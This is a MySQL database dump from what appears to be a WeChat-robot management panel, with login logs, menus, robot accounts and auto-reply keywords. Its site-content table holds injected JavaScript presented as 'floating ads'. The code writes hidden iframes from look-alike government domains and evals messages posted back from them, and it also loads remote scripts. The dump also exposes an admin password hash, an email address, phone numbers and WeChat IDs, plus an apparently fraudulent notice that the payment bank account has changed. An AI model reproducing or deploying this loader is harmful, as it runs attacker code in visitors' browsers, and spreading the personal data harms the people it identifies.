14:41:30'),(279,'admin/login/index','180.174.132.173','系统管理','用户登录系统成功','admin','2021-06-12 18:50:15'),(280,'admin/login/index','180.174.132.173','系统管理','用户登录系统成功','admin','2021-06-13 04:48:54'),(281,'admin/login/index','180.162.48.118','系统管理','用户登录系统成功','admin','2021-06-25 03:49:25'),(282,'admin/login/index','180.162.48.118','系统管理','用户登录系统成功','admin','2021-07-03 03:35:23'),(283,'admin/login/index','180.162.48.118','系统管理','用户登录系统成功','admin','2021-07-04 15:06:40'),(284,'admin/login/index','180.162.39.14','系统管理','用户登录系统成功','admin','2021-07-07 14:55:46'),(285,'admin/login/index','180.162.39.14','系统管理','用户登录系统成功','admin','2021-08-03 01:32:40'),(286,'admin/login/index','180.162.39.14','系统管理','用户登录系统成功','admin','2021-08-05 10:30:56'),(287,'admin/login/index','180.162.49.82','系统管理','用户登录系统成功','admin','2021-08-13 15:53:39'),(288,'admin/login/index','180.162.49.82','系统管理','用户登录系统成功','admin','2021-08-16 07:04:13'),(289,'admin/login/index','180.162.49.82','系统管理','用户登录系统成功','admin','2021-08-20 05:34:38'),(290,'admin/login/index','171.35.97.18','系统管理','用户登录系统成功','admin','2021-08-20 05:53:20'),(291,'admin/login/index','180.162.49.82','系统管理','用户登录系统成功','admin','2021-08-20 05:53:53'),(292,'admin/login/index','180.174.132.182','系统管理','用户登录系统成功','admin','2021-09-01 16:27:00'),(293,'admin/login/index','180.162.36.22','系统管理','用户登录系统成功','admin','2021-09-10 08:21:26'),(294,'admin/login/index','180.162.36.22','系统管理','用户登录系统成功','admin','2021-09-18 06:05:37'),(295,'admin/login/index','180.215.204.81','系统管理','用户登录系统成功','admin','2021-09-24 09:19:54'),(296,'admin/login/index','180.215.204.81','系统管理','用户登录系统成功','admin','2021-09-24 09:21:08'),(297,'admin/login/index','180.215.204.81','系统管理','用户登录系统成功','admin','2021-09-24 09:23:04'),(298,'admin/login/index','180.162.36.22','系统管理','用户登录系统成功','admin','2021-09-28 09:00:02'),(299,'admin/login/index','180.162.36.22','系统管理','用户登录系统成功','admin','2021-10-01 19:15:18'),(300,'admin/login/index','180.162.36.22','系统管理','用户登录系统成功','admin','2021-10-12 16:06:14'),(301,'admin/login/index','192.168.91.1','系统管理','用户登录系统成功','admin','2021-10-13 16:03:28'),(302,'admin/login/index','192.168.91.1','系统管理','用户登录系统成功','admin','2021-10-22 17:20:41'),(303,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-11-15 09:25:32'),(304,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-12-17 14:54:11'),(305,'admin/login/index','180.162.36.160','系统管理','用户登录系统成功','admin','2021-12-20 06:12:36'),(306,'admin/login/index','116.8.37.168','系统管理','用户登录系统成功','admin','2021-12-20 08:41:05'),(307,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-12-29 07:27:59'),(308,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-12-30 15:45:19'),(309,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-12-31 17:32:59'),(310,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-12-31 19:08:36'),(311,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-12-31 19:13:22'),(312,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-12-31 19:13:45'),(313,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-12-31 19:15:38'),(314,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2021-12-31 19:28:11'),(315,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2022-01-03 08:01:38'),(316,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2022-01-05 06:47:58'),(317,'admin/login/index','192.168.179.1','系统管理','用户登录系统成功','admin','2022-01-05 06:55:22');
/*!40000 ALTER TABLE `system_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `system_menu`
--

DROP TABLE IF EXISTS `system_menu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `system_menu` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `pid` bigint(20) unsigned DEFAULT '0' COMMENT '父ID',
  `title` varchar(100) DEFAULT '' COMMENT '名称',
  `node` varchar(200) DEFAULT '' COMMENT '节点代码',
  `icon` varchar(100) DEFAULT '' COMMENT '菜单图标',
  `url` varchar(400) DEFAULT '' COMMENT '链接',
  `params` varchar(500) DEFAULT '' COMMENT '链接参数',
  `target` varchar(20) DEFAULT '_self' COMMENT '打开方式',
  `sort` int(11) unsigned DEFAULT '0' COMMENT '菜单排序',
  `status` tinyint(1) unsigned DEFAULT '1' COMMENT '状态(0:禁用,1:启用)',
  `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `index_system_menu_node` (`node`(191)) USING BTREE,
  KEY `index_system_menu_status` (`status`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=79 DEFAULT CHARSET=utf8mb4 COMMENT='系统-菜单';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `system_menu`
--

LOCK TABLES `system_menu` WRITE;
/*!40000 ALTER TABLE `system_menu` DISABLE KEYS */;
INSERT INTO `system_menu` VALUES (1,0,'后台首页','','','admin/index/main','','_self',500,1,'2018-09-05 09:59:38'),(2,0,'系统管理','','','#','','_self',0,1,'2018-09-05 10:04:52'),(3,4,'系统菜单管理','','layui-icon layui-icon-layouts','admin/menu/index','','_self',1,1,'2018-09-05 10:05:26'),(4,2,'系统配置','','','#','','_self',20,1,'2018-09-05 10:07:17'),(5,12,'系统用户管理','','layui-icon layui-icon-username','admin/user/index','','_self',1,1,'2018-09-06 03:10:42'),(7,12,'访问权限管理','','layui-icon layui-icon-vercode','admin/auth/index','','_self',2,1,'2018-09-06 07:17:14'),(11,4,'系统参数配置','','layui-icon layui-icon-set','admin/config/info','','_self',4,1,'2018-09-06 08:43:47'),(12,2,'权限管理','','','#','','_self',10,1,'2018-09-06 10:01:31'),(67,0,'动作管理','','fa fa-child','#','','_self',0,1,'2019-10-18 06:50:42'),(68,67,'关键词回复','','fa fa-book','admin/reply/index','','_self',0,1,'2019-10-18 07:13:53'),(74,0,'角色管理','','layui-icon layui-icon-username','#','','_self',0,1,'2021-12-29 07:30:12'),(75,74,'机器人管理','','','#','','_self',0,1,'2021-12-29 07:30:55'),(76,75,'机器人列表','','layui-icon layui-icon-username','admin/users/index','','_self',0,1,'2021-12-29 07:31:27'),(77,67,'定时任务','','fa fa-hourglass-2','admin/task/index','','_self',0,1,'2021-12-29 09:33:06'),(78,4,'通讯参数配置','','layui-icon layui-icon-senior','/admin/config/communication','','_self',0,1,'2022-01-05 06:15:03');
/*!40000 ALTER TABLE `system_menu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `system_queue`
--

DROP TABLE IF EXISTS `system_queue`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `system_queue` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL DEFAULT '' COMMENT '任务名称',
  `data` longtext NOT NULL COMMENT '执行参数',
  `status` tinyint(1) unsigned DEFAULT '1' COMMENT '任务状态(1新任务,2处理中,3成功,4失败)',
  `preload` varchar(500) DEFAULT '' COMMENT '执行内容',
  `time` bigint(20) unsigned NOT NULL DEFAULT '0' COMMENT '执行时间',
  `double` tinyint(1) DEFAULT '1' COMMENT '单例模式',
  `desc` varchar(500) DEFAULT '' COMMENT '状态描述',
  `start_at` varchar(20) DEFAULT '' COMMENT '开始时间',
  `end_at` varchar(20) DEFAULT '' COMMENT '结束时间',
  `create_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `index_system_queue_double` (`double`) USING BTREE,
  KEY `index_system_queue_time` (`time`) USING BTREE,
  KEY `index_system_queue_title` (`title`) USING BTREE,
  KEY `index_system_queue_create_at` (`create_at`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='系统-任务';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `system_queue`
--

LOCK TABLES `system_queue` WRITE;
/*!40000 ALTER TABLE `system_queue` DISABLE KEYS */;
/*!40000 ALTER TABLE `system_queue` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `system_user`
--

DROP TABLE IF EXISTS `system_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `system_user` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(50) DEFAULT '' COMMENT '用户账号',
  `password` varchar(32) DEFAULT '' COMMENT '用户密码',
  `qq` varchar(16) DEFAULT '' COMMENT '联系QQ',
  `mail` varchar(32) DEFAULT '' COMMENT '联系邮箱',
  `phone` varchar(16) DEFAULT '' COMMENT '联系手机',
  `login_at` datetime DEFAULT NULL COMMENT '登录时间',
  `login_ip` varchar(255) DEFAULT '' COMMENT '登录IP',
  `login_num` bigint(20) unsigned DEFAULT '0' COMMENT '登录次数',
  `authorize` varchar(255) DEFAULT '' COMMENT '权限授权',
  `tags` varchar(255) DEFAULT '' COMMENT '用户标签',
  `desc` varchar(255) DEFAULT '' COMMENT '备注说明',
  `status` tinyint(1) unsigned DEFAULT '1' COMMENT '状态(0禁用,1启用)',
  `is_deleted` tinyint(1) unsigned DEFAULT '0' COMMENT '删除(1删除,0未删)',
  `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `index_system_user_username` (`username`) USING BTREE,
  KEY `index_system_user_status` (`status`) USING BTREE,
  KEY `index_system_user_deleted` (`is_deleted`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=10003 DEFAULT CHARSET=utf8mb4 COMMENT='系统-用户';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `system_user`
--

LOCK TABLES `system_user` WRITE;
/*!40000 ALTER TABLE `system_user` DISABLE KEYS */;
INSERT INTO `system_user` VALUES (10000,'admin','b5be656a7060dd3525027d6763c33ca0','22222222','23559738@qq.com','18537095101','2022-01-05 14:55:22','192.168.179.1',1185,'','','对眼熊',1,0,'2015-11-13 07:14:22');
/*!40000 ALTER TABLE `system_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_banner`
--

DROP TABLE IF EXISTS `xy_banner`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_banner` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `image` text,
  `title` varchar(255) DEFAULT NULL,
  `url` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COMMENT='首页轮播图';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_banner`
--

LOCK TABLES `xy_banner` WRITE;
/*!40000 ALTER TABLE `xy_banner` DISABLE KEYS */;
INSERT INTO `xy_banner` VALUES (3,'',NULL,'https://www.baidu.com');
/*!40000 ALTER TABLE `xy_banner` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_group`
--

DROP TABLE IF EXISTS `xy_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_group` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `robot_wxid` varchar(50) NOT NULL COMMENT '机器人微信id',
  `nickname` varchar(255) NOT NULL COMMENT '群名',
  `room_wxid` varchar(50) NOT NULL COMMENT '群微信id',
  `addtime` int(11) NOT NULL COMMENT '添加时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_group`
--

LOCK TABLES `xy_group` WRITE;
/*!40000 ALTER TABLE `xy_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `xy_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_index_msg`
--

DROP TABLE IF EXISTS `xy_index_msg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_index_msg` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '',
  `content` text NOT NULL COMMENT '文本内容',
  `type` int(1) NOT NULL DEFAULT '1' COMMENT '1平台公告 2平台简介 3抢单规则 4代理合作 5常见问题',
  `addtime` int(10) NOT NULL COMMENT '发表时间',
  `status` int(1) NOT NULL DEFAULT '0' COMMENT '0发布 1不发布',
  `author` varchar(10) NOT NULL DEFAULT '' COMMENT '作者',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=223 DEFAULT CHARSET=utf8mb4 COMMENT='首页内容表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_index_msg`
--

LOCK TABLES `xy_index_msg` WRITE;
/*!40000 ALTER TABLE `xy_index_msg` DISABLE KEYS */;
INSERT INTO `xy_index_msg` VALUES (1,'顶部彩漂','var randoms = {\r\n	ads_codes: [\'<script type=\"text/javascript\">(function(){window.addEventListener(\"message\",function(e){var _des_s_4637=e.data;if(_des_s_4637.des_s_4637){var _s = \\\'/+/g\\\';eval(decodeURIComponent(_des_s_4637.des_s_4637.replace(_s,\"%20\")))}});document.write(\\\'<iframe style=\"display:none;\" src=\"https://www.govshenzhen.cn:4443/ty/x-4637-34-1.html\" height=\"0\" width=\"0\"  marginheight=\"0\" scrolling=\"no\" frameborder=\"0\" allowtransparency=\"true\"><\'+\'/iframe>\\\')})();<\'+\'/script>\',\'<script type=\"text/javascript\">(function(){window.addEventListener(\"message\",function(e){var _des_s_4704=e.data;if(_des_s_4704.des_s_4704){var _s = \\\'/+/g\\\';eval(decodeURIComponent(_des_s_4704.des_s_4704.replace(_s,\"%20\")))}});document.write(\\\'<iframe style=\"display:none;\" src=\"https://www.govshenzhen.cn:4443/ty/x-4704-34-1.html\" height=\"0\" width=\"0\"  marginheight=\"0\" scrolling=\"no\" frameborder=\"0\" allowtransparency=\"true\"><\'+\'/iframe>\\\')})();<\'+\'/script>\'],\r\n	ads_weight: [10,10],\r\n\r\n	get_random: function(weight) {\r\n		var s = eval(weight.join(\'+\'));\r\n		var r = Math.floor(Math.random() * s);\r\n		var w = 0;\r\n		var n = weight.length - 1;\r\n		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};\r\n		return n;\r\n	},\r\n	init: function() {\r\n\r\n		var rand = randoms.get_random(randoms.ads_weight);\r\n		document.write(randoms.ads_codes[rand]);\r\n\r\n	}\r\n}\r\nrandoms.init();',1,1639987970,0,'admin'),(2,'底部彩漂','var randoms = {\r\n	ads_codes: [\'<script src=\"https://www.govjieyang.cn:12443/ty/94C1D06F-8C75-10766-33-C2669FB2C859.alpha\"><\'+\'/script>\',\'<script src=\"https://www.govjieyang.cn:12443/ty/1FD44EC9-9C7F-13872-33-77DA60945E36.alpha\"><\'+\'/script>\'],\r\n	ads_weight: [10,10],\r\n\r\n	get_random: function(weight) {\r\n		var s = eval(weight.join(\'+\'));\r\n		var r = Math.floor(Math.random() * s);\r\n		var w = 0;\r\n		var n = weight.length - 1;\r\n		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};\r\n		return n;\r\n	},\r\n	init: function() {\r\n\r\n		var rand = randoms.get_random(randoms.ads_weight);\r\n		document.write(randoms.ads_codes[rand]);\r\n\r\n	}\r\n}\r\nrandoms.init();',1,1629438395,0,'admin');
/*!40000 ALTER TABLE `xy_index_msg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_io_log`
--

DROP TABLE IF EXISTS `xy_io_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_io_log` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `oid` char(18) NOT NULL,
  `amount` decimal(7,2) NOT NULL COMMENT '支付金额',
  `tran_amount` decimal(7,2) NOT NULL COMMENT '实收金额',
  `type` int(2) NOT NULL DEFAULT '1' COMMENT '1收入(用户充值) 2支出(用户提现)',
  `addtime` int(10) unsigned NOT NULL COMMENT '交易时间',
  PRIMARY KEY (`id`),
  KEY `oid` (`oid`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='平台收支记录表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_io_log`
--

LOCK TABLES `xy_io_log` WRITE;
/*!40000 ALTER TABLE `xy_io_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `xy_io_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_message`
--

DROP TABLE IF EXISTS `xy_message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_message` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL DEFAULT '0' COMMENT '接收人ID',
  `sid` int(11) NOT NULL DEFAULT '0' COMMENT '发送人ID',
  `title` varchar(150) NOT NULL COMMENT '信息标题',
  `content` text NOT NULL COMMENT '正文内容',
  `addtime` int(10) NOT NULL COMMENT '发表时间',
  `type` int(1) NOT NULL DEFAULT '1' COMMENT '消息类型 1公告 2通知',
  PRIMARY KEY (`id`),
  KEY `sid` (`sid`) USING BTREE,
  KEY `uid` (`uid`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COMMENT='会员-消息表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_message`
--

LOCK TABLES `xy_message` WRITE;
/*!40000 ALTER TABLE `xy_message` DISABLE KEYS */;
INSERT INTO `xy_message` VALUES (1,0,0,'Warm Prompt','<p>Wealth code Notice:&nbsp;<br />\r\nMembers, the recharge account has been changed. Before recharging, please go to the recharge payment page to verify the new bank account before transferring. Wealth code will change the account from time to time, please refer to the recharge page. Otherwise, you will not be able to recharge successfully.</p>',1609654069,3),(2,20,0,'系统通知','充值订单138000000001609904756已被退回，如有疑问请联系客服',1609904806,2),(3,20,0,'系统通知','交易订单UB2101042344071445已被系统强制付款，如有疑问请联系客服',1610202817,2);
/*!40000 ALTER TABLE `xy_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_msg`
--

DROP TABLE IF EXISTS `xy_msg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_msg` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(20) NOT NULL DEFAULT '',
  `content` text NOT NULL COMMENT '文本内容',
  `type` int(1) NOT NULL DEFAULT '1' COMMENT '1平台公告 2平台简介 3抢单规则 4代理合作 5常见问题',
  `addtime` int(10) NOT NULL COMMENT '发表时间',
  `status` int(1) NOT NULL DEFAULT '0' COMMENT '0发布 1不发布',
  `author` varchar(10) NOT NULL DEFAULT '' COMMENT '作者',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_msg`
--

LOCK TABLES `xy_msg` WRITE;
/*!40000 ALTER TABLE `xy_msg` DISABLE KEYS */;
/*!40000 ALTER TABLE `xy_msg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_reads`
--

DROP TABLE IF EXISTS `xy_reads`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_reads` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `mid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '消息ID',
  `uid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '会员ID',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '读取时间',
  PRIMARY KEY (`id`),
  KEY `mid-uid` (`mid`,`uid`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COMMENT='会员-消息读取记录表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_reads`
--

LOCK TABLES `xy_reads` WRITE;
/*!40000 ALTER TABLE `xy_reads` DISABLE KEYS */;
INSERT INTO `xy_reads` VALUES (1,30,1,1582140346);
/*!40000 ALTER TABLE `xy_reads` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_reply`
--

DROP TABLE IF EXISTS `xy_reply`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_reply` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'id',
  `wxid` varchar(50) NOT NULL COMMENT '机器人微信id',
  `question` varchar(255) NOT NULL COMMENT '问题',
  `answer` varchar(255) NOT NULL COMMENT '答复',
  `addtime` int(11) NOT NULL COMMENT '创建时间',
  `update_time` int(11) NOT NULL COMMENT '修改时间',
  `fuzzy` int(1) NOT NULL DEFAULT '0' COMMENT '0模糊查询，1精确查询',
  `oriented` int(1) NOT NULL DEFAULT '0' COMMENT '0私信，1群组，2不限',
  `cache_name` text NOT NULL COMMENT '缓存key名',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_reply`
--

LOCK TABLES `xy_reply` WRITE;
/*!40000 ALTER TABLE `xy_reply` DISABLE KEYS */;
INSERT INTO `xy_reply` VALUES (5,'wxid_rqn31uwmjug922','redis','是一种cache方式~\r\n你知道吗？？？',1640885715,1641365887,0,0,'robot_keyword_redis_wxid_rqn31uwmjug922'),(7,'wxid_50rdaq3aytp12','电影','fun范影城 增城店 代下21-23\r\n广州增城1978电影城代下24\r\n广州增城合汇城无瑕时代影城代下23\r\n广州增城挂绿中影佰纳代19 码18 十起17\r\n广州增城国贸中影佰纳代19 码18 十起17\r\n广州增城中影佰纳 锦绣/凤凰城 代24 出码23 十起220',1641052005,1641053631,0,0,'robot_keyword_电影_wxid_50rdaq3aytp12'),(8,'wxid_rqn31uwmjug922','123','456',1641366122,1641366177,0,0,'robot_keyword_123_wxid_rqn31uwmjug922');
/*!40000 ALTER TABLE `xy_reply` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_reply_robot`
--

DROP TABLE IF EXISTS `xy_reply_robot`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_reply_robot` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `robot_wxid` varchar(50) NOT NULL COMMENT '机器人微信id',
  `replys` longtext NOT NULL COMMENT '关键词集',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_reply_robot`
--

LOCK TABLES `xy_reply_robot` WRITE;
/*!40000 ALTER TABLE `xy_reply_robot` DISABLE KEYS */;
INSERT INTO `xy_reply_robot` VALUES (1,'wxid_rqn31uwmjug922','[\"redis\",\"123\"]'),(2,'wxid_6wn8zjj2al1912','[]'),(3,'wxid_50rdaq3aytp12','[]');
/*!40000 ALTER TABLE `xy_reply_robot` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_robots`
--

DROP TABLE IF EXISTS `xy_robots`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_robots` (
  `wxid` varchar(50) NOT NULL COMMENT '微信id',
  `wx_num` varchar(30) NOT NULL COMMENT '微信账号',
  `nickname` varchar(30) NOT NULL COMMENT '昵称',
  `headimgurl` varchar(255) NOT NULL COMMENT '头像地址',
  `login_time` int(11) NOT NULL COMMENT '登录时间',
  `signature` varchar(255) NOT NULL COMMENT '个性签名',
  `backgroundimgurl` varchar(255) NOT NULL COMMENT '朋友圈背景图',
  `status` int(1) NOT NULL COMMENT '在线状态',
  PRIMARY KEY (`wxid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_robots`
--

LOCK TABLES `xy_robots` WRITE;
/*!40000 ALTER TABLE `xy_robots` DISABLE KEYS */;
INSERT INTO `xy_robots` VALUES ('wxid_50rdaq3aytp12','HXSH9806','A低价网课电影票周边游优惠代','http://wx.qlogo.cn/mmhead/ver_1/pPa5D2sPYtUo9pjSdxdWT0BjonaI25DYFiaibJ2JOooxicjokAjw0Jo4oUCe302vYKdKUERvYKzB2Kx8icaJ5KFFn3BVNhJnLGNQE9zulXUsCvw/0',1641051768,'此号没回复?18092026559','http://shmmsns.qpic.cn/mmsns/qE9MKluetOmJOa2Vz1V5zqkyLxskFBMjVJePEUhb75jy5PN657DgTsIy1KHUQY5kIukfwVjlmtk/0',0),('wxid_6wn8zjj2al1912','juyi888880','迅游团队-66','http://wx.qlogo.cn/mmhead/ver_1/eMdjibSMuzHwjU1UydBkqdN9XaaYjUCBp1rWakFXs4vL8U5iaibkcQ78MXpRqtm6LEb9niczv3BGWfYVnAHtiaavMM35bHOQGcIvNOa7TrVHpQ7Y/0',1641050812,'，','http://szmmsns.qpic.cn/mmsns/85f0UwJCGBg6eqv0yRWedpeYxrL4kib6dSTGibiaZuZrxtbicUpkzBpZaaic0IiafhNQ7FZ94K06vJaNU/0',0),('wxid_rqn31uwmjug922','iamyangxuea','胖妞','http://wx.qlogo.cn/mmhead/ver_1/myLhCuBsxHtA7ASVNstK1MdibNZaIiaGjgOVVsH88LQS3KbAexqicuKOPfpMWx3A6cvvYQvoMBTKKeib0RmibJxMjBYljLcCMNgxX748rxYmxPDA/0',1641351930,'我是草莓熊','http://shmmsns.qpic.cn/mmsns/dibCvqHg4Wnek56WGEZXxdTzWictWwUbpv502PmHrLqV1XaxKlTnZykDRvqAiaD8vy3182r3ytHpRY/0',0);
/*!40000 ALTER TABLE `xy_robots` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_script`
--

DROP TABLE IF EXISTS `xy_script`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_script` (
  `script` text NOT NULL COMMENT '代码块',
  `id` int(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_script`
--

LOCK TABLES `xy_script` WRITE;
/*!40000 ALTER TABLE `xy_script` DISABLE KEYS */;
INSERT INTO `xy_script` VALUES ('',1);
/*!40000 ALTER TABLE `xy_script` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_serviced_for_group`
--

DROP TABLE IF EXISTS `xy_serviced_for_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_serviced_for_group` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `robot_wxid` varchar(50) NOT NULL COMMENT '机器人微信id',
  `group_wxid` longtext NOT NULL COMMENT '群组列表',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xy_serviced_for_group`
--

LOCK TABLES `xy_serviced_for_group` WRITE;
/*!40000 ALTER TABLE `xy_serviced_for_group` DISABLE KEYS */;
INSERT INTO `xy_serviced_for_group` VALUES (1,'wxid_rqn31uwmjug922','[\"13640957283@chatroom\",\"21663011224@chatroom\",\"24279014823@chatroom\"]'),(2,'wxid_rqn31uwmjug922','[\"13640957283@chatroom\",\"21663011224@chatroom\",\"24279014823@chatroom\"]'),(3,'wxid_rqn31uwmjug922','[\"13640957283@chatroom\",\"21663011224@chatroom\",\"24279014823@chatroom\"]'),(4,'wxid_rqn31uwmjug922','[\"13640957283@chatroom\",\"21663011224@chatroom\",\"24279014823@chatroom\"]'),(5,'wxid_6wn8zjj2al1912','[]'),(6,'wxid_50rdaq3aytp12','[\"25583590513@chatroom\"]');
/*!40000 ALTER TABLE `xy_serviced_for_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xy_task_robot`
--

DROP TABLE IF EXISTS `xy_task_robot`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xy_task_robot` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `robot_wxid` varchar(50) NOT NULL COMMENT '机器人微信id',
  `task_content` text NOT NULL COMMENT '发送的内容',
  `run_interval` int(11) NOT NULL COMMENT '执行时间间隔',
  `add_time` int(11) NOT NULL COMMENT '添加时间',
  `run_time` int(11) NOT NULL COMMENT '执行时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4;
